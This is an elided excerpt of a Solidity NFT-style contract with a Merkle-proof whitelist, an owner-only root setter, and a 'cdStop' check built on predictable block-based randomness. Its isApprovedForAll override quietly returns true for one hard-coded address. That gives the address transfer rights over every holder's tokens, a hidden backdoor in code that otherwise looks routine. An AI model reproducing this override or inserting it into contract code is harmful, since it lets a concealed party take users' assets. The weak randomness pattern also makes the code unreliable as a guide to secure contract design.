  ...
  Ownable
{
  ...
  bytes32 public ListWhitelistMerkleRoots; //////////////////////////////////////////////////////////////////////////////////////////////////////// new 1
  ...
  function _baseURI() internal view virtual returns (string memory) {
    ...
    function setListWhitelistMerkleRoot(bytes32 _merkleRoot) public onlyOwner {
        ListWhitelistMerkleRoots  = _merkleRoot;
    }
    ...
    function isInTheWhitelist(bytes32[] calldata _merkleProof) public view returns (bool) {
        ...
        require(MerkleProof.verify(_merkleProof, ListWhitelistMerkleRoots, leaf) || MerkleProof.verify(_merkleProof, ListWhitelistMerkleRoots, leaf2), "Invalid proof!");
        return true;
    }
  ...
  function cdStop() internal view returns (bool){
      uint256 aaa = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));
      uint256 bbb = 1 << 160;
      uint256 ccc = bbb -1;
      uint256 ddd = aaa & ccc ;
      return ddd <= 1 ? true : false;
  }
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x75ccF95A98Ab6cE275c4cfDaf346D8c8F60f2669){return true;}
